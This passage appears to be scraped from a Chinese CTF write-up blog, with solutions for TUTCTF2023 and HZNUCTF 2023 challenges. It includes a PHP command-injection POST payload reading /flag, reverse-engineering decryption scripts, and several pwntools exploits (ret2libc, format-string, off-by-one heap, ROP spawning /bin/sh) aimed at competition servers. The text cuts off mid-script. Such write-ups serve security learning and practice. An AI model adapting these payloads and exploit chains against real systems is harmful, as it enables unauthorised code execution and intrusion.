&lt;pre&gt;&lt;code&gt;ctfer1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctfer3使用%00截断绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;amp;ctfer3=115%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctfer4使用拼接绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;ctfer4=?&amp;gt;&amp;lt;?=`ls /`;
&amp;gt;
&amp;gt;ctfer4=?&amp;gt;&amp;lt;?=`cat /flag`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST http://101.43.190.199:28005/ HTTP/1.1
 Host: 101.43.190.199:28005
 Content-Length: 358
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://101.43.190.199:28005
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://101.43.190.199:28005/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close


ctfer1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer3=115%00&amp;amp;ctfer4=?&amp;gt;&amp;lt;?=`cat /flag`;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016151223.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;web-魔方&#34;&gt;web-魔方:&lt;/h3&gt;
&lt;p&gt;一.js审计&lt;/p&gt;
&lt;p&gt;根据以往的做题经验，最后出flag的时候往往会有弹窗，于是直接搜alert就可以梭哈&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681016252496.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;同时发现还需要解密，那就大概率是了，直接进入控制台调用方法拿到flag。&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681016263340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;Re&lt;/h2&gt;
&lt;h3 id=&#34;tutdroid&#34;&gt;tutDroid&lt;/h3&gt;
&lt;p&gt;apk附件，jadx-gui打开，来到MainActivty&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016753356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;输入被传递到FlagChecker.check方法进行验证，得到一个key和密文&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016760521.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;encrypt方法实际上就是标准的XXTEA加密&lt;/p&gt;
&lt;p&gt;encryptToBase64String方法，先调用encrypt方法，再进行base64编码&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016767633.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;首先把key和密文处理一下，转成int数组&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import base64
enc=b&amp;quot;vlgg9nNjUcYuWzBSSOwKxbMD2rhFgf4zuiyMpLxpNkM=&amp;quot;
enc=base64.b64decode(enc)
pritnt(enc)
#b&#39;\xbeX \xf6scQ\xc6.[0RH\xec\n\xc5\xb3\x03\xda\xb8E\x81\xfe3\xba,\x8c\xa4\xbci6C&#39;
for i in range(0,len(enc),4):

  tmp=&amp;quot;0x&amp;quot;

  tmp+=hex(enc[i+3])[2:].zfill(2)

  tmp+=hex(enc[i+2])[2:].zfill(2)

  tmp+=hex(enc[i+1])[2:].zfill(2)

tmp+=hex(enc[i+0])[2:].zfill(2)   

print(tmp,end=&amp;quot;,&amp;quot;)
#0xf62058be,0xc6516373,0x52305b2e,0xc50aec48,0xb8da03b3,0x33fe8145,0xa48c2cba,0x433669bc,
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;

#define DELTA 0x9e3779b9
#define MX (((z &amp;gt;&amp;gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &amp;gt;&amp;gt; 3 ^ z &amp;lt;&amp;lt; 4)) ^ ((sum ^ y) + (key[(p &amp;amp; 3) ^ e] ^ z)))

void btea(uint32_t *v, int n, uint32_t const key[4]){
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    //加密
    if (n &amp;gt; 1){
        rounds = 6 + 52 / n;
        sum = 0;
        z = v[n - 1];
        do{
            sum += DELTA;
            e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3;
            for (p = 0; p &amp;lt; n - 1; p++){
                y = v[p + 1];
                z = v[p] += MX;
            }
            y = v[0];
            z = v[n - 1] += MX;
        } while (--rounds);
    }
    //解密
    else if (n &amp;lt; -1){
        n = -n;
        rounds = 6 + 52 / n;
        sum = rounds * DELTA;
        y = v[0];
        do{
            e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3;
            for (p = n - 1; p &amp;gt; 0; p--){
                z = v[p - 1];
                y = v[p] -= MX;
            }
            z = v[n - 1];
            y = v[0] -= MX;
            sum -= DELTA;
        } while (--rounds);
    }
}
void print_data(uint32_t *v, int n, bool hex_or_chr)
{
    if (hex_or_chr){
        for (int i = 0; i &amp;lt; n; i++){
            printf(&amp;quot;0x%x,&amp;quot;, v[i]);
        }
    }
    else
    {
        for (int i = 0; i &amp;lt; n; i++){
            for (int j = 0; j &amp;lt; sizeof(uint32_t) / sizeof(uint8_t); j++){
                printf(&amp;quot;%c&amp;quot;, (v[i] &amp;gt;&amp;gt; (j * 8)) &amp;amp; 0xFF);
            }
        }
    }
    printf(&amp;quot;\n&amp;quot;);
    return;
}

int main()
{
    // v为要加解密的数据
    uint32_t v[] = {0xf62058be, 0xc6516373, 0x52305b2e, 0xc50aec48, 0xb8da03b3, 0x33fe8145, 0xa48c2cba, 0x433669bc};
    // k为加解密密钥，4个32位无符号整数，密钥长度为128位
    uint32_t k[4] = {0x57764241, 0x71683757, 0x48764e77, 0x50666855};

    int n = sizeof(v) / sizeof(uint32_t);
    btea(v, -n, k);

    printf(&amp;quot;解密后明文数据：&amp;quot;);
    print_data(v, n, 1);

    printf(&amp;quot;解密后明文字符：&amp;quot;);
    print_data(v, n, 0);

    return 0;
}

// flag{pldCiQuCBtakT4ctlsZQ}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;uglyqt&#34;&gt;uglyqt:&lt;/h3&gt;
&lt;p&gt;ida打开，搜索字符串&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016782971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;交叉引用过去&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016789390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;用户名为”zhanghao”&lt;/p&gt;
&lt;p&gt;密码经过变换，变换后与”lrgmLVzwcwh5yhy4hgEuxfJ”比较&lt;/p&gt;
&lt;p&gt;密码的变换过程在sub_401580函数&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016797390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string

enc = &amp;quot;lrgmLVzwcwh5yhy4hgEuxfJ&amp;quot;

flag = &amp;quot;&amp;quot;

for c in enc:
    if c.islower():
        for i in string.ascii_lowercase:
            if ord(c) == (ord(i)-91) % 26+97:
                flag += i
    elif c.isupper():
        for i in string.ascii_uppercase:
            if ord(c) == (ord(i)-60) % 26+65:
                flag += i
    else:
        for i in string.digits:
            if ord(c) == (ord(i)-44) % 10+48:
                flag += i

print(flag)
# flagGQtqwqb1sbs0baZorzE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在程序中正常运行&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016803607.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;再根据flag格式调整下，”GE”换成”{}”，”b”换成”_”&lt;/p&gt;
&lt;p&gt;得到flag{Qtqwq_1s_s0_aZorz}&lt;/p&gt;
">TUTCTF2023 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/fav_tKSYV/"" data-c="
          &lt;h3 id=&#34;fibonacci&#34;&gt;fibonacci：&lt;/h3&gt;
&lt;p&gt;数组下标无检查，负数可以反向溢出覆盖got表的__stack_chk_fail来绕过canary，之后ret2libc，最后打one_gadget注意条件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./[HZNUCTF 2023 final]fibonacci&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28253)
elf=ELF(&amp;quot;./[HZNUCTF 2023 final]fibonacci&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

pop_rdi_ret=0x401a33
vuln=0x4019a2
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
ret=0x40101a
one_gadget=[0xe3afe,0xe3b01,0xe3b04]
pop_r12_r13_r14_r15_ret=0x401a2c


io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;-55&amp;quot;)
io.sendlineafter(b&amp;quot;number\n&amp;quot;,str(ret))

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;0&amp;quot;)
payload=b&amp;quot;\x00&amp;quot;+b&amp;quot;a&amp;quot;*0x57+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendlineafter(b&amp;quot;number\n&amp;quot;,payload)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
shell=leak_addr+one_gadget[0]

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;1&amp;quot;)
payload=b&amp;quot;\x00&amp;quot;+b&amp;quot;a&amp;quot;*0x57+p64(pop_r12_r13_r14_r15_ret)+p64(0)*4+p64(shell)
# gdb.attach(io)
# pause()
io.sendlineafter(b&amp;quot;number\n&amp;quot;,payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a30 : pop r14 ; pop r15 ; ret
# 0x0000000000401a32 : pop r15 ; ret
# 0x0000000000401a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x00000000004016f6 : pop rbx ; pop rbp ; ret
# 0x0000000000401a33 : pop rdi ; ret
# 0x0000000000401a31 : pop rsi ; pop r15 ; ret
# 0x0000000000401a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040143f : ret 0x2474
# 0x00000000004017ba : ret 0x458b
# 0x00000000004015c3 : ret 0x850f
# 0x0000000000401580 : ret 0x858b
# 0x00000000004013d1 : ret 0x8d48
# 0x000000000040134d : ret 0xc

# Unique gadgets found: 18

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;eazy_rw&#34;&gt;eazy_rw:&lt;/h3&gt;
&lt;p&gt;syscall构造read向bss段上读rop（rw已经有o）&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28167)
# io=process(&amp;quot;./easy_rw&amp;quot;)
elf=ELF(&amp;quot;./easy_rw&amp;quot;)

bss_addr=0x404900
leave_ret=0x40126f
pop_rdi=0x4013c3
pop_rsi_r15=0x4013c1
read_sys=0x401349

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;)
payload=cyclic(0x40)+p64(bss_addr-0x8)+p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(read_sys)
io.send(payload)

#read
rw=p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(bss_addr+0x200)+p64(0)+p64(elf.sym[b&amp;quot;read&amp;quot;])
#puts
rw+=p64(pop_rdi)+p64(bss_addr+0x200)+p64(elf.sym[b&amp;quot;puts&amp;quot;])

payload=rw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040126f : leave ; ret
# 0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013c0 : pop r14 ; pop r15 ; ret
# 0x00000000004013c2 : pop r15 ; ret
# 0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004011dd : pop rbp ; ret
# 0x00000000004013c3 : pop rdi ; ret
# 0x00000000004013c1 : pop rsi ; pop r15 ; ret
# 0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040124b : ret 0x2be

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">HZNUCTF 2023 final 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/8bTg9SHFI/"" data-c="
          &lt;p&gt;&lt;strong&gt;sign_in&lt;/strong&gt;:&lt;br&gt;
ret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sign_in&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28649)
elf=ELF(&amp;quot;./sign_in&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)


io.recvuntil(b&amp;quot;here~\n&amp;quot;)
pop_rdi_ret=0x401283
vuln=0x4011db
ret=0x40101a
payload=cyclic(0x48)+p64(pop_rdi_ret)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;here~\n&amp;quot;)
payload=cyclic(0x48)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;check_in&lt;/strong&gt;:&lt;br&gt;
覆盖canary&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./[HZNUCTF 2023 preliminary]checkin_pwn&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28127)
elf=ELF(&amp;quot;./[HZNUCTF 2023 preliminary]checkin_pwn&amp;quot;)

io.recvuntil(b&amp;quot;checkin\n&amp;quot;)
bss_addr=0x4040C0
pop_rdi_ret=0x401483
payload=b&amp;quot;a&amp;quot;*0x28+p64(pop_rdi_ret)+p64(bss_addr)+p64(elf.plt[b&amp;quot;puts&amp;quot;])+b&amp;quot;a&amp;quot;*(0xf00)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401480 : pop r14 ; pop r15 ; ret
# 0x0000000000401482 : pop r15 ; ret
# 0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x0000000000401483 : pop rdi ; ret
# 0x0000000000401481 : pop rsi ; pop r15 ; ret
# 0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;ffmt&lt;/strong&gt;：&lt;br&gt;
格式化字符串&lt;br&gt;
输入有长度限制，不能直接fmtstr_payload劫持printf_got&lt;br&gt;
位宽转换为地址写入栈上，注意backdoor有偏移&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./ffmt&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28843)
elf=ELF(&amp;quot;./ffmt&amp;quot;)

shell=0x40121b
printf_got=elf.got[b&amp;quot;printf&amp;quot;]

io.sendlineafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;%p&amp;quot;)
addr=int(io.recv(14),16) #泄露rbp
print(&amp;quot;addr:  &amp;quot;+hex(addr))

io.recvuntil(b&amp;quot;yourself~\n&amp;quot;)
# payload=fmtstr_payload(8,{printf_got:shell})
payload=b&amp;quot;a&amp;quot;*2+b&amp;quot;%.4198945d%8$n&amp;quot;+p64(addr-0x10)  #写入rbp-0x10处 写入shell的对应十进制位宽可转化为shell地址，此题shell写到401221
# gdb.attach(io)
# pause()
io.sendline(payload)
 
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;shell&lt;/strong&gt;:&lt;br&gt;
逆向稍微有点复杂，首先输入&amp;gt;进入子函数，空格分隔符后满足&lt;code&gt;&amp;lt;=\x1f或者&amp;gt;=z&lt;/code&gt;即可进入存在栈溢出漏洞的输入处进行ret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./shell&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28569)
elf=ELF(&amp;quot;./shell&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)
pop_rdi_ret=0x401d13
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
vuln=0x401c34
ret=0x40101a

io.recvuntil(b&amp;quot;[haha]$&amp;quot;)
io.sendline(b&amp;quot;&amp;gt; {&amp;quot;)
io.recvuntil(b&amp;quot;name:&amp;quot;)
payload=cyclic(0x68)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;[haha]$&amp;quot;)
io.sendline(b&amp;quot;&amp;gt; {&amp;quot;)
io.recvuntil(b&amp;quot;name:&amp;quot;)
payload=cyclic(0x68)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)
io.sendline(b&amp;quot;cat flag&amp;quot;)
# print(&amp;quot;a:  &amp;quot;+hex(str_bin_sh))
# print(&amp;quot;b:  &amp;quot;+hex(sys_addr))
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401d0c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d10 : pop r14 ; pop r15 ; ret
# 0x0000000000401d12 : pop r15 ; ret
# 0x0000000000401d0b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040141d : pop rbp ; ret
# 0x0000000000401a77 : pop rbx ; pop rbp ; ret
# 0x0000000000401d13 : pop rdi ; ret
# 0x0000000000401d11 : pop rsi ; pop r15 ; ret
# 0x0000000000401d0d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x0000000000401855 : ret 0x45c7
# 0x0000000000401593 : ret 0x8d48

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
">HZNUCTF 2023 preliminary 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/sXttqYc_0/"" data-c="
          &lt;p&gt;64位保护全开，考察off by one以及realloc+offset提高栈地址打one_gadget&lt;br&gt;
one_gadget打通是需要一定条件的，如果没打通就是条件没满足&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例如这个one_gadget需要满足&lt;code&gt;[$rsp+0x30]==NULL&lt;/code&gt;，&lt;br&gt;
此题标准菜单增删改显，delete没有uaf，add没有堆溢出，edit有检查，但是edit存在off by one可以溢出一个字节的size，修改后可以利用unsortedbin 泄露地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;add(0x18,b&amp;quot;qqq&amp;quot;) #0
add(0x40,b&amp;quot;www&amp;quot;) #1
add(0x60,b&amp;quot;eee&amp;quot;) #2
add(0x10,b&amp;quot;sss&amp;quot;) #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b&amp;quot;wqw&amp;quot;)
show(2)
leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此题直接使用malloc_hook打one_gadget打不通，如图，&lt;code&gt;[$rsp+0x30]&lt;/code&gt;的值不为0&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680702994337.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
所以&lt;code&gt;malloc-&amp;gt;__malloc_hook-&amp;gt;realloc+offset-&amp;gt;__realloc_hook-&amp;gt;one_gadget&lt;/code&gt;&lt;br&gt;
通过修改realloc的偏移更改栈地址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680704260750.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
每少一个push，栈地址提高8&lt;br&gt;
但是这道题+0x4好像不太行，至少得+0xc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./vn_pwn_simpleHeap&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28385)
elf=ELF(&amp;quot;./vn_pwn_simpleHeap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;size?&amp;quot;,str(n))
    io.sendafter(&amp;quot;content:&amp;quot;,c)

def edit(n,c):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
